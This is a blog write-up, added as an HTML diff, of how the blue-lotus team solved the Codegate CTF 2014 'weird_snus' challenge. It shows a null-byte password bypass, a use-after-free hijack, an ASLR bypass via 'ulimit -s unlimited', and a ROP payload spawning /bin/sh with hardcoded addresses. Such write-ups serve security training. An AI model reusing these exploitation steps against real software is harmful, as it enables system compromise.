@@ -1,0 +1,251 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Codegate CTF Quals 2014 weird_snus writeup - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="vulnerabilities Password protection can be easily bypassed by giving a input of ‘0x00’ We quickly identified there is a use-after-free bug. After &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <div id="header-inner">
+    <span class="first"><a href="/">blue-lotus</a></span>
+    <span><a href="/about">about</a></span>
+    <span class="last"><a href="/atom.xml" title="subscribe via RSS">rss</a></span>
+  </div>
+</hgroup>
+
+</header>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Codegate CTF Quals 2014 Weird_snus Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-02-25T00:00:00+08:00" pubdate data-updated="true">Feb 25<span>th</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2 id="vulnerabilities">vulnerabilities</h2>
+<ol>
+  <li>Password protection can be easily bypassed by giving a input of ‘0x00’</li>
+  <li>We quickly identified there is a use-after-free bug. After verifying the password, the program runs into an endless command processing mode, where user can input various buffer command to do some strange things. The first letter in each command represents the action to perform. Command A will check if a struct pointer exists, if so, it will call the function pointer in the struct, or it will allocate a new struct. Command D will reallocate the struct can free it later without cleat the struct pointer. So fist calling command D, and then calling command A will trigger a use-after-free crash. If we find somewhere to do the similar size malloc and fill the struct including the function pointer, we could hijack the control of the program.</li>
+</ol>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Luckily we found that there is a command M can do arbitrary size allocation. The path of current working directory will be put in the content of the new allocation. So we can construct a directory, whose path contains evil function pointer. Then we trigger the use-after-free bug mentioned above.</p>
+
+<p>To get a shell, we first put a large amount of ROP payload(system(‘/bin/sh’)) in the environment variable,
+and then we use an <code>add esp</code> gadget in the libc to raise the stack to the place where environment variables are stored in. <code>ulimit -s unlimited</code> trick is used to get rid of libc address randomization.</p>
+
+<h2 id="code">Code</h2>
+
+<h3 id="important-addresses">important addresses</h3>
+
+<pre><code>system: 0x40079260 
+binsh: 0x401a1b98
+
+11817d:       81 c4 8c 22 00 00       add    $0x228c,%esp
+0x40079260 - 0x41260 + 0x11817d 0x4015017d   \x7d\x01\x15\x40
+</code></pre>
+
+<h3 id="commands">commands</h3>
+<p>Disable libc randomization:</p>
+
+<pre><code>ulimit -s unlimited
+</code></pre>
+
+<p>Create a directory and cd to it:</p>
+
+<pre><code>python -c 'import os; os.makedirs("/tmp/aaaa/aa\x7d\x01\x15\x40")'
+</code></pre>
+
+<p>Set ROP payloads in an environment variable and trigger use-after-free bug. Notice that the python variable <code>o</code> should be adjusted to achieve the stack alignment. The number below is just an example.</p>
+
+<pre><code>export EXPLOIT=$(python -c 'o = 4; print "a" * o + "\x60\x92\x07\x40\x60\x92\x07\x40\x98\x1b\x1a\x40\x98\x1b\x1a\x40" * 2000+"a" * (8 - o)'); (python -c 'print "\x00\nkelwin\nA\nM\nG\x10\x00\x00\x00\nA\n"'; echo "cat /home/strongest_snus/flag"; cat ) | /home/strongest_snus/weird_snus \(
+</code></pre>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">kelwin</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-02-25T00:00:00+08:00" pubdate data-updated="true">Feb 25<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/" title="Previous Post: Codegate CTF Quals 2014 Web Proxy writeup">&laquo; Codegate CTF Quals 2014 Web Proxy writeup</a>
+      
+      
+        <a class="basic-alignment right" href="/2014-02-25-codegate-ctf-quals-2014-weirdshark-writeup/" title="Next Post: Codegate CTF Quals 2014 weirdshark writeup">Codegate CTF Quals 2014 weirdshark writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-weirdshark-writeup/">Codegate CTF Quals 2014 Weirdshark Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/">Codegate CTF Quals 2014 Weird_snus Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/">Codegate CTF Quals 2014 Web Proxy Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-clone-technique-writeup/">Codegate CTF Quals 2014 Clone Technique Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-chrono-writeup/">Codegate CTF Quals 2014 Chrono Writeup</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'bluelotus';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/';
+        var disqus_url = 'http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
